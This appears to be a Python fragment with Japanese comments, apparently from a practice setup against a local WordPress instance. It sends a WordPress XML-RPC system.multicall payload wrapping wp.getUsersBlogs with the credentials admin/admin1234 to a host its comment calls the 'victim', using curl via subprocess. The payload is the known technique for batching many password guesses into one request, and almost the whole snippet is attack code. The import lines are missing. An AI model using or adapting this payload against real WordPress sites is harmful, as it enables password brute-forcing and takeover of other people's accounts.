#victimに対してpostTextの内容をcurlを使ってPostする
if __name__=='__main__':
    postText="<?xml version=¥"1.0¥"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>admin</string></value><value><string>admin1234</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
    command = ["curl", "-D","-","localhost","-d",postText]
    res = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    #resはバイト列なので、可読な文字列に変換
    sys.stdout.buffer.write(res.stdout)
    print(res.stdout)
